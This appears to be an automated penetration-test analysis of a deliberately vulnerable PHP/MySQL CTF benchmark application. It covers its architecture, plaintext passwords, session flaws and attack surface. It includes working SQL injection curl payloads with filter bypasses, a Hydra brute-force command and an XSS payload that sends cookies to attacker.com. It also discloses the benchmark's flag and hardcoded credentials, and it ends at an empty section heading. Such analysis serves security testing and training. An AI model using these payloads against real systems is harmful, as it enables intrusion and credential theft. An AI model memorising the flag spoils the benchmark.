# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All subsequent tasks must adhere to this scope. Before reporting any finding (e.g., an entry point, a vulnerability sink), verification has been performed to ensure it meets the "In-Scope" criteria.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints.
- Endpoints requiring authentication via the application's standard login mechanisms.
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code.

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `go run ./cmd/...`, `python scripts/...`).
- A development environment's internal tooling (e.g., a "run script" button in an IDE).
- CI/CD pipeline scripts or build tools (e.g., Dagger build definitions).
- Database migration scripts, backup tools, or maintenance utilities.
- Local development servers, test harnesses, or debugging utilities.
- Static files or scripts that require manual opening in a browser (not served by the application).

---

## 1. Executive Summary

The XBEN-095-24 application is a minimalist PHP 7.4.33 web application running on Apache 2.4.54 with MySQL 5.7.15 backend, consisting of only 116 lines of code across 3 PHP files. This application represents an **intentionally vulnerable security benchmark/CTF challenge** with critical security deficiencies spanning all domains including authentication, authorization, session management, input validation, and data protection.

The most critical finding is a **SQL injection vulnerability** in the search functionality (`search.php:25`) that enables complete database extraction despite weak input filtering. Additionally, the application stores all passwords in **plaintext** without any hashing mechanism, discloses the CTF flag upon successful authentication, and lacks fundamental security controls such as CSRF protection, rate limiting, security headers, and proper session management. The technology stack comprises end-of-life software (PHP 7.4 EOL November 2022) with known unpatched vulnerabilities.

From an external attacker perspective with no internal network access, the primary attack surface consists of three HTTP endpoints exposed on port 8080. The most exploitable path involves SQL injection to extract credentials followed by authentication to retrieve the FLAG value (`flag{787d5a7f-ec79-4620-99c5-17c50dced80a}`). The application exemplifies severe security anti-patterns and should be considered a high-value training environment rather than production-ready code. No API schemas, webhooks, or file upload handlers exist—this is purely a traditional form-based web application with database-backed authentication and search capabilities.

---

## 2. Architecture & Technology Stack

### Framework & Language

The application is built on **vanilla PHP 7.4.33** (released November 15, 2022, End-of-Life November 28, 2022) with **no MVC framework** whatsoever. There is no Laravel, Symfony, CodeIgniter, or any abstraction layer—just raw PHP with inline HTML and direct database queries. This architectural decision has profound security implications: without framework-level protections, every security control must be manually implemented, and as evidenced by the codebase, virtually none have been. The application relies solely on native PHP functions and the mysqli extension for database connectivity.

The absence of a framework means no built-in CSRF protection, no automatic output encoding, no security middleware pipeline, and no standardized input validation. The PHP 7.4 runtime itself is vulnerable to known CVEs including CVE-2023-0568 (authentication bypass) and CVE-2023-0567 (buffer overflow), with no security patches available post-EOL. The security posture is further degraded by exposed version information in HTTP headers (`X-Powered-By: PHP/7.4.33`), enabling attackers to target known vulnerabilities specific to this build.

### Architectural Pattern

This is a **monolithic 2-tier architecture** deployed via Docker Compose with two containerized services: a `web` container (PHP/Apache) and a `db` container (MySQL). The presentation and application layers are tightly coupled within the PHP files, with inline HTML embedded directly in server-side code. Database queries are executed directly from request handlers without any repository pattern, service layer, or data access abstraction.

The Docker network topology uses a bridge network (`xben-095-24_default`) where the web service exposes port 8080 externally (mapped to internal port 80) while the MySQL database on port 3306 remains isolated within the container network. This network isolation provides partial defense-in-depth—external attackers cannot directly connect to the database, forcing exploitation through the web application layer. However, this is the only architectural security boundary present. Trust boundaries are poorly defined, with no separation between public-facing and privileged operations. All three PHP endpoints execute with identical privileges despite vastly different security requirements (public search vs. authenticated login).

### Critical Security Components

**Authentication Implementation:** The application implements a custom, manually-coded authentication system in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/login.php` without leveraging any authentication library or framework. At line 28, the code uses prepared statements (`$conn->prepare()`) with parameter binding, which correctly prevents SQL injection in the authentication flow. However, the `filter_chars()` function at lines 17-19 is a security theater—it simply returns input unchanged (`return $str;`), providing zero protection while creating a false sense of security.

**Critical Vulnerability - No Password Hashing:** The most severe cryptographic failure is the complete absence of password hashing. Line 28 queries the database with `SELECT * FROM users WHERE username = ? AND password = ?`, performing a direct plaintext comparison. The database contains `insert into users (username, password) values ("admin", "ThisIsBestPassword");` in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/init.sql:13`. No use of `password_hash()`, `password_verify()`, bcrypt, Argon2, PBKDF2, or any cryptographic hashing is present anywhere in the codebase. This means a database breach, SQL injection, or even log file exposure immediately compromises all user credentials.

**Input Filtering (Ineffective):** The `search.php` file implements a `filter_chars()` function (lines 15-22) that attempts to block SQL injection patterns by filtering whitespace (`/\s/`) and keywords (`/and|null|where|limit|like|substring|substr/i`). However, this blacklist approach is fundamentally flawed and easily bypassed using SQL comments (`/**/`, `#`), alternative operators (`OR`, `||`, `UNION`), or unfiltered keywords (`SELECT`, `FROM`). The filtered input is then directly concatenated into a SQL query at line 25: `$sql = "SELECT * from users where username=\"". filter_chars($_REQUEST["username"])."\"";`, creating a critical SQL injection vulnerability despite the filtering attempt.

**Session Security (Critically Flawed):** PHP native sessions are initiated with `session_start()` in both `index.php:1` and `login.php:2`, but the configuration is catastrophically insecure. Verified via `php -i` output, the session cookie flags are: `session.cookie_httponly = 0` (JavaScript can steal cookies via `document.cookie`), `session.cookie_secure = 0` (cookies transmitted over unencrypted HTTP), and `session.cookie_samesite = no value` (no CSRF protection). Even more critically, after successful authentication at `login.php:36`, **no session variables are set**—the code displays the flag and exits without establishing any authentication state. This means there's no persistent session management, no way to track authenticated users across requests, and sessions serve no security purpose whatsoever.

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms and Security Properties

The application implements a single authentication endpoint at **`POST /login.php`** that accepts `username` and `password` via POST parameters. The authentication flow queries the MySQL database using a prepared statement at lines 28-31:

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

**Security Analysis:** While the prepared statement architecture correctly prevents SQL injection in the authentication pathway, the plaintext password comparison represents a **critical cryptographic failure** (OWASP A02:2021 - Cryptographic Failures). The query searches for an exact match between user-supplied password and the database `password` field, which stores values like `"ThisIsBestPassword"` in cleartext as seen in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/init.sql:13`.

**Information Disclosure:** The endpoint leaks authentication state through differential responses. A valid username with invalid password returns `"Invalid password."` (line 43), while an invalid username returns `"Error! "` (line 46). This username enumeration vulnerability enables attackers to compile lists of valid accounts before attempting password attacks. Successful authentication displays `"Congratz, flag is {FLAG}"` (line 36) where `{FLAG}` is the environment variable value `flag{787d5a7f-ec79-4620-99c5-17c50dced80a}` retrieved at line 8 via `$flag = getenv('FLAG');`.

**Exhaustive Authentication API Endpoints:**
- **`GET /login.php`** - Displays login form (lines 48-62), no authentication required
- **`POST /login.php`** - Processes authentication (lines 23-47), validates credentials, returns flag on success
- **No other authentication endpoints exist** - No registration, logout, password reset, MFA, token refresh, or OAuth endpoints

**Known Credentials (Hardcoded):**
- Username: `admin`
- Password: `ThisIsBestPassword`
- Source: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/init.sql:13`

### Session Management and Token Security

**Session Cookie Configuration (All Flags Disabled):** The application uses PHP's default file-based session storage with critically insecure cookie parameters. Exact configuration from `php -i` output shows `session.cookie_httponly = 0`, `session.cookie_secure = 0`, and `session.cookie_samesite = no value`. The actual HTTP response header is:

```
Set-Cookie: PHPSESSID=54550d57dda189efb71b1ac789ab8603; path=/
```

**File and Line Numbers for Cookie Flag Configuration:** Session cookies are initialized in two locations, but **neither location configures security flags**:
1. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/index.php:1` - `session_start();` with no preceding `session_set_cookie_params()`
2. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/login.php:2` - `session_start();` with no preceding `session_set_cookie_params()`

**Security Implications:** The disabled `HttpOnly` flag means any XSS vulnerability (such as the reflected XSS in `search.php:30`) can execute `document.cookie` to steal session tokens. The disabled `Secure` flag means session cookies are transmitted over unencrypted HTTP connections, enabling Man-in-the-Middle (MITM) attackers on the network path to intercept PHPSESSID values. The missing `SameSite` attribute provides no defense against Cross-Site Request Forgery attacks.

**Session Storage Backend:** Sessions are stored in `/tmp` as flat files (`session.save_handler => files`, `session.save_path => /tmp`). This provides no encryption at rest, no distributed session management for horizontal scaling, and potential information disclosure on multi-tenant systems sharing the `/tmp` directory.

**Critical Gap - No Session State Management:** Despite initiating sessions, the application **never sets any `$_SESSION` variables** after successful authentication. At `login.php:36`, after validating credentials, the code displays the flag and calls `die()` without storing user identity, authentication status, or any state information in the session. This means subsequent requests have no way to determine if a user is authenticated. There is no `$_SESSION['user_id']`, `$_SESSION['authenticated']`, or similar state tracking. Sessions are completely unused for authorization purposes.

### Authorization Model and Potential Bypass Scenarios

**Authorization Status: NON-EXISTENT.** The application implements **zero authorization controls**. There is no Role-Based Access Control (RBAC), no permission system, no access control lists, and no concept of user roles. The database schema (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/init.sql:8-11`) defines a `users` table with only `id`, `username`, and `password` columns—no `role`, `role_id`, `permissions`, or privilege fields exist.

**Public vs Protected Endpoints:** All three endpoints (`/index.php`, `/login.php`, `/search.php`) are **publicly accessible** with no authentication checks. The search functionality at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/search.php` accepts `$_REQUEST["username"]` at line 25 and queries the database without verifying who is making the request. Any anonymous user can search for any username, retrieve user data, and exploit the SQL injection vulnerability.

**Bypass Scenario - Horizontal Privilege Escalation:** Since `/search.php` implements no checks for authenticated users or resource ownership, an attacker can enumerate all usernames in the database by iterating through common names or using SQL injection to dump the entire `users` table. The query `SELECT * from users where username="{input}"` at line 25 returns all user data when exploited with payloads like `" OR 1=1#` (after bypassing filters).

**Bypass Scenario - Authentication State Manipulation:** The absence of session-based authorization means there's no state to manipulate. Every request is treated as anonymous. An attacker doesn't need to bypass authorization checks because none exist. The only "protected" resource is the FLAG value revealed after login, but this requires valid credentials rather than authorization—it's authentication-only protection.

### Multi-Tenancy Security Implementation

**Not Applicable:** This is a single-tenant application with no multi-tenancy architecture, no tenant isolation, and no shared data partitioning requirements.

### SSO/OAuth/OIDC Flows

**Status: NOT IMPLEMENTED.** The application has no Single Sign-On, OAuth, OpenID Connect, or SAML integration. There are no callback endpoints, no state parameter validation, no nonce validation, and no external identity provider integrations. All authentication is self-contained using the local MySQL database.

---

## 4. Data Security & Storage

### Database Security Analysis

**Database Technology:** MySQL 5.7.15 (released September 2016, **severely outdated**—current version is 5.7.44 with 29 patch versions and critical security fixes missed). The database runs in a Docker container from the official `mysql:5.7.15` image as specified in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/Dockerfile:1`.

**Encryption Status (At-Rest):** **NO ENCRYPTION.** The MySQL data directory stores all table data, indexes, and logs in plaintext without InnoDB tablespace encryption (`innodb_encrypt_tables`) or filesystem-level encryption. The database initialization script (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/init.sql`) creates the `users` table with no encryption specifications. Passwords are stored in the `password varchar(256)` column as plaintext strings like `"ThisIsBestPassword"` (line 13), directly comparable without hashing.

**Encryption Status (In-Transit):** **NO ENCRYPTION.** The database connection established at lines 6-11 in both `login.php` and `search.php` uses `mysqli_connect()` without SSL/TLS parameters. The connection string omits `MYSQLI_CLIENT_SSL` flags, certificate paths, or `mysqli_ssl_set()` configuration. All SQL queries, authentication credentials (`MyPass1234`), and result sets traverse the Docker bridge network unencrypted. While the database port (3306) is not exposed externally per `docker-compose.yml:7` (`expose: - 3306` without `ports` mapping), internal container-to-container traffic is vulnerable to network sniffing via `docker network inspect` or container escape scenarios.

**Access Controls (Principle of Least Privilege - PARTIAL):** The application connects using the `appuser` account created at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/init.sql:2,15`:

```sql
create user 'appuser'@'%' identified by 'MyPass1234';
grant select on users to 'appuser'@'%' identified by 'MyPass1234';
```

Verified privileges show **SELECT-only** access to the `appdb.users` table. This represents a **partial security win**—SQL injection attacks cannot execute `INSERT`, `UPDATE`, `DELETE`, `DROP`, `CREATE`, or `ALTER` statements. An attacker exploiting the `search.php:25` SQL injection can read all table data but cannot modify records, escalate privileges, or execute stored procedures. However, the `@'%'` wildcard allows connections from any host within the Docker network (no IP restriction), and the weak password `MyPass1234` is hardcoded in three locations: `docker-compose.yml:21`, `mysql/Dockerfile:3` (ENV), and `mysql/init.sql:2,15`.

**Query Safety Analysis:**
- **SECURE:** `login.php:28-30` uses `mysqli::prepare()` with `bind_param()` for parameterized queries
- **CRITICAL VULNERABILITY:** `search.php:25` uses direct string concatenation: `$sql = "SELECT * from users where username=\"". filter_chars($_REQUEST["username"])."\"";` followed by `$conn->query($sql)` at line 26

The filter at lines 15-22 attempts to block SQL injection but is bypassable via `UNION SELECT`, `OR 1=1`, comments (`#`, `--`, `/**/`), and hex encoding. The use of `$_REQUEST` (line 25) accepts input from GET, POST, and COOKIE superglobals, expanding the attack surface.

### Data Flow Security

**Sensitive Data Paths:** The application processes three categories of sensitive data:

1. **Authentication Credentials (Username/Password):**
   - **Source:** User input via `POST /login.php` (lines 24-25)
   - **Transmission:** HTTP POST (unencrypted, no TLS/HTTPS)
   - **Processing:** Plaintext comparison in SQL query (`login.php:28`)
   - **Storage:** Plaintext in `appdb.users.password` column
   - **Protection Mechanisms:** NONE (no hashing, no encryption, no masking)

2. **CTF Flag Value (`flag{787d5a7f-ec79-4620-99c5-17c50dced80a}`):**
   - **Source:** `.env` file at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/.env:1`
   - **Build Distribution:** Docker build arg → Dockerfile ENV → Container environment variable
   - **Runtime Access:** `getenv('FLAG')` at `login.php:8`
   - **Disclosure:** Echoed to HTTP response at `login.php:36` after successful authentication
   - **Protection Mechanisms:** Authentication-only (no encryption of flag value itself)

3. **Database Credentials:**
   - **Source:** Environment variables in `docker-compose.yml:18-22`
   - **Exposure:** Visible via `docker inspect xben-095-24_web_1`, `/proc/1/environ` inside container, and version control history
   - **Protection Mechanisms:** NONE (plaintext in configuration files committed to git)

**Output Encoding Gaps:** At `search.php:30`, the code echoes database results directly into HTML without sanitization:

```php
echo "User exists: " . $row["username"] .'<br/>';
```

No `htmlspecialchars()`, `htmlentities()`, or Content Security Policy exists. If a username containing `<script>alert('XSS')</script>` exists in the database (injectable via the SQL injection vulnerability), it will execute in victims' browsers. The lack of output encoding creates a Stored XSS pathway: SQL injection → insert malicious username → reflected to other users via search.

### Multi-Tenant Data Isolation

**Not Applicable:** Single-tenant architecture with no tenant identifiers, no row-level security, and no data partitioning requirements.

---

## 5. Attack Surface Analysis

### External Entry Points - Detailed Analysis

**ENDPOINT 1: Root Landing Page (`GET /index.php` or `GET /`)**

- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/index.php`
- **Authentication Required:** No (public endpoint)
- **Functionality:** Displays static HTML with two hyperlinks: `/search.php` and `/login.php`
- **Session Handling:** Calls `session_start()` at line 1 but never reads or writes session variables
- **Input Vectors:** None (no user input accepted)
- **Attack Surface Assessment:** **Minimal.** The endpoint consists of 9 lines of static HTML with no dynamic content, no form processing, and no database interaction. Primary risk is session fixation (an attacker can set `PHPSESSID` cookie before victim's authentication due to predictable session IDs and no regeneration), but this is low-impact given sessions aren't used for authorization. The endpoint serves as a navigation hub but presents no direct exploitation opportunities.

**ENDPOINT 2: User Search Functionality (`GET/POST /search.php`)**

- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/search.php`
- **Authentication Required:** No (public endpoint)
- **HTTP Methods:** Accepts both GET and POST via `$_REQUEST["username"]` (line 25)
- **Input Parameters:** `username` (string, no length validation, no character whitelist)
- **Functionality:** Searches the `users` table for matching usernames and displays existence status

**Critical Vulnerability - SQL Injection (Line 25):**
```php
$sql = "SELECT * from users where username=\"". filter_chars($_REQUEST["username"])."\"";
$result = $conn->query($sql);
```

**Filter Bypass Techniques:** The `filter_chars()` function (lines 15-22) blocks whitespace (`/\s/`) and keywords (`and`, `null`, `where`, `limit`, `like`, `substring`, `substr`), but attackers can bypass using:
- **Comments:** `/**/` to replace spaces: `admin"/**/OR/**/1=1#`
- **Alternative Operators:** `OR`, `||`, `UNION`, `XOR` (not filtered)
- **Unfiltered Keywords:** `SELECT`, `FROM`, `UNION`, `INTO` (case-sensitive bypass: `AnD`)
- **Hex Encoding:** `0x61646d696e` instead of `'admin'`

**Proof-of-Concept Exploits:**
```bash
# Boolean-based blind injection
curl -X POST http://localhost:8080/search.php -d 'username=admin"||1#'

# UNION-based data exfiltration
curl -X POST http://localhost:8080/search.php -d 'username="union/**/select/**/1,group_concat(username,0x3a,password),3/**/from/**/users#'

# Time-based blind injection
curl -X POST http://localhost:8080/search.php -d 'username="||if(1=1,sleep(5),0)#'
```

**Secondary Vulnerability - Reflected XSS (Line 30):**
```php
echo "User exists: " . $row["username"] .'<br/>';
```

If the database contains malicious usernames (injected via SQL injection or direct database access), they are reflected without `htmlspecialchars()` encoding. Example attack chain: (1) SQL inject `<script>fetch('http://attacker.com?c='+document.cookie)</script>` as username, (2) search for that username, (3) XSS payload executes in victim's browser stealing `PHPSESSID` cookie.

**Attack Surface Assessment:** **CRITICAL.** This endpoint represents the highest-risk attack surface with multiple chained vulnerabilities enabling database extraction, XSS attacks, and potential lateral movement within the Docker network.

**ENDPOINT 3: Authentication (`GET/POST /login.php`)**

- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/app/login.php`
- **Authentication Required:** No (public form), but processes authentication credentials
- **HTTP Methods:** GET (display form, lines 48-62) and POST (process credentials, lines 23-47)
- **Input Parameters:** 
  - `username` (string, no validation, max length 256 per database schema)
  - `password` (string, no validation, plaintext comparison)

**Functionality:** Validates credentials against the database, displays FLAG on success, error messages on failure.

**Vulnerability - Username Enumeration:** Different error messages leak authentication state:
```php
// Line 36: Valid user + correct password
echo 'Congratz, flag is ' . $flag;

// Line 43: Valid user + wrong password  
echo "Invalid password.";

// Line 46: Invalid user
echo "Error! ";
```

An attacker can enumerate valid usernames by observing responses: `"Invalid password."` confirms the username exists, `"Error! "` indicates it doesn't.

**Vulnerability - No Rate Limiting:** The endpoint accepts unlimited login attempts without throttling, account lockout, CAPTCHA, or IP-based restrictions. Tools like Hydra or Burp Intruder can brute-force the known username `admin` with password lists at high speed:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid password"
```

**Vulnerability - CSRF (No Token Protection):** The login form (lines 52-61) lacks CSRF tokens:
```html
<form action="login.php" method="POST">
    <input type="text" name="username" required>
    <input type="password" name="password" required>
    <button type="submit">Login</button>
</form>
```

An attacker can host a malicious page that auto-submits login attempts on behalf of victims, enabling distributed brute-force attacks using victims' browsers as proxies.

**Security Strength:** Uses prepared statements (`$stmt = $conn->prepare()` at line 28) which **prevents SQL injection** despite the useless `filter_chars()` function. This is the only security control properly implemented in the application.

**Attack Surface Assessment:** **HIGH.** While SQL-injection-resistant, the endpoint is vulnerable to brute-force attacks, username enumeration, CSRF, and lacks session management. The FLAG disclosure at line 36 makes successful authentication immediately valuable to attackers.

### Internal Service Communication

**Service Topology:** Docker Compose defines two services in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/docker-compose.yml`:

1. **`web` service (Lines 12-23):** PHP/Apache application container
   - Exposed port: `8080:80` (external:internal)
   - Environment variables: `MYSQL_HOST=db`, `MYSQL_USER=appuser`, `MYSQL_PASSWORD=MyPass1234`, `MYSQL_DATABASE=appdb`
   - Depends on: `db` service (health check dependency)

2. **`db` service (Lines 4-10):** MySQL database container
   - Exposed port: `3306` (internal only, no external mapping)
   - Health check: `mysqladmin ping -h localhost --password=MyPass1234 -u appuser`

**Trust Boundaries:** The primary trust boundary is the Docker network perimeter. External users can only interact with the web service on port 8080; direct MySQL connections are impossible from outside the Docker network. However, **there are no trust boundaries within the web application itself**—all PHP endpoints execute with identical privileges and database credentials.

**Security Assumptions:**
1. **Database Isolation:** Assumes container network isolation prevents direct database access. This is **valid** per `docker-compose.yml` configuration but vulnerable to container escape exploits or misconfigurations.
2. **Single Database User:** All web endpoints (public search, authentication) use the same `appuser` database account. There's no separation between low-privilege (search) and high-privilege (authentication) operations. A SQL injection in the search function inherits the same database access as the login function.
3. **No Service-to-Service Authentication:** The web service connects to MySQL using hardcoded credentials in environment variables. No mutual TLS, certificate validation, or credential rotation exists.

**Attack Scenario - Lateral Movement:** If an attacker achieves remote code execution on the web container (e.g., via PHP vulnerability), the `MYSQL_PASSWORD` environment variable (`MyPass1234`) is immediately accessible via `/proc/self/environ` or `getenv()`. The attacker can then directly connect to the `db` service on the internal Docker network using `mysql -h db -u appuser -pMyPass1234 appdb` to dump the entire database without triggering web application logs.

### Input Validation Patterns

**Validation Architecture:** The application implements a **failed blacklist approach** with two `filter_chars()` functions:

**Pattern 1 - login.php (Lines 17-19):** Security Theater
```php
function filter_chars($str) {
    return $str;  // No-op function, returns input unchanged
}
```
This function is called at lines 24-25 before querying the database but provides **zero protection**. Its existence suggests incomplete security refactoring or intentional vulnerability (CTF scenario). The prepared statement at line 28 prevents SQL injection despite this useless filter.

**Pattern 2 - search.php (Lines 15-22):** Bypassable Blacklist
```php
function filter_chars($str){
    if(preg_match('/\s/', $str))
        exit('<strong>some item is filtered! </strong>');
    
    if(preg_match('/(and|null|where|limit|like|substring|substr)/i', $str))
        exit('<strong>some item is filtered! </strong>');
    return $str;
}
```

**Analysis:** The filter blocks whitespace characters (`\s` includes spaces, tabs, newlines) and seven SQL keywords (`and`, `null`, `where`, `limit`, `like`, `substring`, `substr`) case-insensitively. However:
- **Bypass via Comments:** `/**/` can replace spaces: `admin"/**/OR/**/1=1#`
- **Bypass via Alternative Keywords:** `OR`, `UNION`, `SELECT`, `FROM`, `INTO`, `OUTFILE` are not filtered
- **Bypass via Boolean Operators:** `||` (OR), `&&` (AND), `|`, `&` bypass keyword restrictions
- **Bypass via Functions:** `MID()`, `LEFT()`, `RIGHT()`, `INSTR()` replace blocked `SUBSTRING()`

**Missing Validations:**
- No length restrictions (database allows `varchar(256)` but no input length check)
- No character whitelisting (alphanumeric + safe characters)
- No parameterization in `search.php` (should use prepared statements like `login.php`)
- No output encoding (no `htmlspecialchars()` on database results)
- No request signature validation or integrity checks

**Best Practice Comparison:** OWASP recommends **positive validation** (whitelist allowed characters) and **parameterized queries** (complete separation of code and data). This application does the opposite: negative validation (blacklist dangerous characters) and string concatenation. Only `login.php` accidentally follows best practices by using `mysqli::prepare()`.

### Background Processing

**Status:** **NONE.** The application has no background jobs, async task queues, message brokers, scheduled cron jobs, or worker processes. All processing is synchronous within the HTTP request-response cycle. Each PHP file executes database queries inline and returns results immediately without queueing or deferring work.

**Security Implications:** While the absence of background processing eliminates attack surfaces related to job queues (e.g., Celery task poisoning, RabbitMQ message injection), it also means no separation of privileges. High-risk operations (search with SQL injection vulnerability) run with the same privileges and database credentials as authentication operations. There's no opportunity to isolate dangerous tasks into sandboxed workers with restricted permissions.

---

## 6. Infrastructure & Operational Security

### Secrets Management

**Status: CATASTROPHIC FAILURE.** All secrets are hardcoded in plaintext across multiple files committed to version control:

**FLAG Value (CTF Objective):**
- **Location 1:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/.env:1`
  ```
  FLAG="flag{787d5a7f-ec79-4620-99c5-17c50dced80a}"
  ```
- **Location 2:** `docker-compose.yml:15` - Passed as build argument
- **Location 3:** `app/Dockerfile:9-10` - Stored as environment variable
- **Location 4:** Container runtime - Accessible via `docker inspect` or `/proc/self/environ`

**Database Credentials (MySQL Root):**
- **Location:** `mysql/Dockerfile:3`
  ```dockerfile
  ENV MYSQL_ROOT_PASSWORD=password
  ```
- **Password:** `password` (trivially weak, dictionary word)

**Application Database Credentials:**
- **Location 1:** `docker-compose.yml:19-21`
  ```yaml
  MYSQL_USER=appuser
  MYSQL_PASSWORD=MyPass1234
  MYSQL_DATABASE=appdb
  ```
- **Location 2:** `mysql/init.sql:2,15` - Hardcoded in SQL commands
- **Location 3:** `docker-compose.yml:10` - Hardcoded in health check command:
  ```yaml
  healthcheck:
    test: ["CMD", "mysqladmin" ,"ping", "-h", "localhost","--password=MyPass1234","-u","appuser"]
  ```
  This means the database password appears in container process list (`ps aux`), Docker inspect metadata, and health check logs.

**Application Credentials:**
- **Admin Password:** `ThisIsBestPassword` (plaintext in database, `mysql/init.sql:13`)

**Secrets Rotation:** NONE. No mechanisms for rotating the FLAG, database passwords, or any credentials exist. Credentials are baked into Docker images at build time.

**Secrets Management Best Practices Violated:**
- ❌ Secrets in version control (`.env`, `docker-compose.yml`, `init.sql` all tracked by git)
- ❌ Secrets in environment variables (accessible via `/proc`, `docker inspect`)
- ❌ Secrets in process arguments (health check command line)
- ❌ No secrets vault (no HashiCorp Vault, AWS Secrets Manager, or similar)
- ❌ No encryption of secrets at rest
- ❌ No rotation mechanism

### Configuration Security

**Environment Separation:** The application has **no environment separation**. There's no distinction between development, staging, and production configurations. The same `.env` file, `docker-compose.yml`, and hardcoded credentials would be used across all environments. The `benchmark.json` metadata file (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/benchmark.json`) indicates this is a CTF training environment (`"difficulty": "beginner"`), but no configuration mechanism exists to deploy this differently.

**Security Headers Configuration:** Searched for security headers in Apache configuration and application code. Results:

**Apache Configuration:** No custom security headers. Inspected the `php:7.4-apache` Docker image default configuration at `/etc/apache2/sites-enabled/000-default.conf` (default VirtualHost) and `/etc/apache2/apache2.conf`. No `Header set` directives found. The `mod_headers` module is not enabled in `/etc/apache2/mods-enabled/`.

**Application-Level Headers:** Searched all PHP files for `header()` function calls that might set security headers:
```bash
grep -r "header(" app/*.php
# No matches found
```

No calls to `header('Content-Security-Policy: ...')`, `header('X-Frame-Options: ...')`, `header('Strict-Transport-Security: ...')`, or any security header configuration exist.

**Infrastructure Configuration (Nginx/Ingress/CDN):** The application runs directly on Apache within the Docker container with no reverse proxy, CDN, or ingress controller. The `docker-compose.yml` exposes port 8080 directly to the Apache server without any intermediate infrastructure that could inject security headers. No `nginx.conf`, Kubernetes Ingress manifests, or CDN configuration files exist in the codebase.

**Cache-Control Headers:** The application sends `Cache-Control: no-store, no-cache, must-revalidate` (verified in HTTP responses), but this is **PHP's default session handling** (line 1: `session_start()`) rather than intentional security configuration. It prevents caching of session cookies but doesn't protect against other attacks.

**Missing Security Headers:**
- **Strict-Transport-Security (HSTS):** NOT CONFIGURED in any infrastructure layer
- **Content-Security-Policy:** NOT CONFIGURED
- **X-Frame-Options:** NOT CONFIGURED
- **X-Content-Type-Options:** NOT CONFIGURED
- All other security headers absent

### External Dependencies

**Third-Party Services:** NONE. The application is entirely self-contained with no external API calls, no third-party authentication (OAuth), no payment processors, no CDN dependencies, no analytics services, and no external HTTP requests.

**PHP Extensions:** Only `mysqli` is installed (`app/Dockerfile:3`). The base `php:7.4-apache` image includes core extensions (session, json, filter) but no security-focused extensions like `sodium`, `openssl` (available but unused), or `password_hash` (unused despite availability).

**Dependency Manifest:** NONE. No `composer.json`, `package.json`, `requirements.txt`, or package manager files exist. The application has zero declared dependencies beyond the base Docker images.

**Docker Base Images:**
- `php:7.4-apache` (official PHP image, but PHP 7.4 is EOL with unpatched CVEs)
- `mysql:5.7.15` (official MySQL image, **severely outdated** from 2016)

**Security Implications:** While zero external dependencies eliminates supply chain attack risks, it also means zero security libraries. No input validation library (like HTMLPurifier), no CSRF protection library, no security framework exists. Every security control must be manually implemented, and as evidenced, virtually none are.

### Monitoring & Logging

**Application Logging:** Searched for logging statements:
```bash
grep -r "error_log\|syslog\|file_put_contents.*log" app/*.php
# No matches found
```

The application implements **NO custom logging**. No authentication attempts (successful or failed) are logged, no SQL injection attempts are recorded, and no security events are captured.

**PHP Error Logging:** Default PHP configuration (`php -i` output shows `error_reporting = 22527`, `display_errors = STDOUT`, `log_errors = On`) sends errors to standard output, which Docker captures in container logs. However, this only logs PHP runtime errors (fatal errors, warnings), not security events.

**Database Logging:** MySQL general query log and slow query log are **not enabled** by default in the `mysql:5.7.15` image. No custom MySQL configuration (`my.cnf`) exists in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-095-24/mysql/` to enable logging. SQL injection attempts are **not logged** unless they cause MySQL errors.

**Access Logging:** Apache access logs are enabled by default (`/var/log/apache2/access.log` within the container) using the Combined Log Format, capturing IP, timestamp, HTTP method, path, status code, and User-Agent. However:
- Logs are **not persisted** outside the container (no Docker volume mount)
- Logs are **not centralized** (no syslog, ELK stack, or log aggregation)
- Logs are **lost on container restart** unless manually extracted via `docker logs`

**Security Event Visibility:**
- ❌ Failed login attempts (not logged)
- ❌ SQL injection attempts (not logged)
- ❌ XSS payloads (not logged)
- ❌ Brute force patterns (not detected)
- ❌ Credential changes (N/A, no change functionality)
- ❌ Session hijacking (undetectable, no session fingerprinting)
- ✓ HTTP access patterns (logged by Apache, but not monitored)

**Alerting:** NONE. No monitoring dashboards, no alerting thresholds, no anomaly detection, no SIEM integration.

---

## 7. Overall Codebase Indexing

